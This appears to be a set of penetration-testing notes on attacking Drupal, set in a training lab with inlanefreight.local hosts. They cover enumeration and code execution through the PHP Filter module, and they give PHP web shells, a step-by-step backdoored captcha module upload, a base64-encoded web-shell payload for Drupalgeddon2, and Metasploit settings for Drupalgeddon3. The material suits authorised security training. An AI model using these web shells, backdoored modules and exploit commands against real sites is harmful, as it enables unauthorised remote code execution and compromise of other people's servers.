# Drupal

Drupal is another open source CMS built with PHP and supports MySQL, PostreSQL, or SQLite backends.

### Discovery/Footprinting

```shell-session
curl -s http://drupal.inlanefreight.local | grep Drupal

<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
      <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
```

Drupal installs can also be identified by the "Powered by Drupal" header or footer message, the CHANGELOG.txt or README.txt file, or references to /node in the robots.txt.&#x20;

Nodes are used by drupal to index the website and any presence of /node should be looked at as an indicator that drupal is in use.&#x20;

### Drupal User Types&#x20;

1. `Administrator`: This user has complete control over the Drupal website.
2. `Authenticated User`: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
3. `Anonymous`: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.

### Enumeration

Version can be found many times in CHANGELOG or README:

```shell-session
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

Droopescan can also find version as well as installed plugins:

```shell-session
droopescan scan drupal -u http://drupal.inlanefreight.local
```

### RCE w/ PHP Filter Module&#x20;

In versions before version 8, a Drupal Admin can login and enable this module, which allows PHP code to be modified and executed.&#x20;

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

Once enabled, go to Content -> Add Content -> Basic Page&#x20;

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

Here you would input your malicious code to gain a webshell or reverse shell.&#x20;

Use an `MD5` hash representation can originate from any hashed command or string that isn't easily guessable and is not present in any dictionary wordlists used for directory brute-forcing.

<pre class="language-php"><code class="lang-php"><strong>&#x3C;?php
</strong>system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
</code></pre>

Ensure Text Format is set to PHP code:&#x20;

<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

### Install PHP Filter Module (8 and newer)

Starting in version 8, the PHP Filter module is not installed by default. In this instance we can install it to exploit this functionality.&#x20;

1.  Download module on your attack box:&#x20;

    ```shell-session
    wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
    ```
2. Navigate too `Administration` > `Reports` > `Available updates`
3. Install the module and continue with exploiting PHP Filter Module (documented above)

### Creating and Uploading a backdoored module

Users with enough permissions are capable of uploading new modules. An existing module can be modified to include a PHP web shell or reverse shell and uploaded. Modules can be found on the drupal.org website.

1. Get the module&#x20;
   1.

       ```shell-session
       wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
       ```
   2.

       ```shell-session
       tar xvf captcha-8.x-1.2.tar.gz
       ```
2. Create PHP webshell&#x20;
   1.

       ```php
       <?php
       system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
       ?>
       ```
3. Create .htaccess file to give access to the folder&#x20;
   1.

       ```html
       <IfModule mod_rewrite.c>
       RewriteEngine On
       RewriteBase /
       </IfModule>
       ```
4. Combine files and re-zip for upload&#x20;
   1.

       ```shell-session
       mv shell.php .htaccess captcha
       tar cvf captcha.tar.gz captcha/
       ```
5. Upload backdoor module&#x20;
   1. Manage -> Extend -> Install new module
6. Execute backdoor
   1.

       ```shell-session
       curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
       ```

### Known Vulnerabilties

there is a collection of critical RCE vulnerabilities known as Drupalgeddon:

#### Drupalgeddon:

* [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
  * POC exploit: [https://www.exploit-db.com/exploits/34992](https://www.exploit-db.com/exploits/34992)
  * metasploit module: [exploit/multi/http/drupal\_drupageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/)&#x20;

```shell-session
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

#### Drupalgeddon2

* [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.
  * POC exploit: [https://www.exploit-db.com/exploits/44448](https://www.exploit-db.com/exploits/44448)

```shell-session
python3 drupalgeddon2.py 
# Check that hello.txt exists and exploit was successful 
curl -s http://drupal-dev.inlanefreight.local/hello.txt
# modify script to include web shell
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
# replacec echo command in the exploit script 
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
# re run exploit 
python3 drupalgeddon2.py
# execute code 
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

#### Drupalgeddon3

* [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.
  * Exploit POC: [https://github.com/rithchard/Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3)
  * metasploit module: multi/http/drupal\_drupageddon3

1. Capture login in Burpsuite to get valid session cookie:
   1.

       <figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
2.

    ```shell-session
    msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
    msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
    msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
    msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
    msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
    msf6 exploit(multi/http/drupal_drupageddon3) > show options
    ```

### Droopescan and python versions

You may run into issues with newer python versions with Droopescan. Check out the cross linked page to learn about managing differnet python versions across virtual environments.&#x20;

{% embed url="https://adams-hacknotes.gitbook.io/adams-hacknotes/~/revisions/pjBmh8xYFncc9B8ppWZm/group-1/python-versions-and-virtual-environments" %}
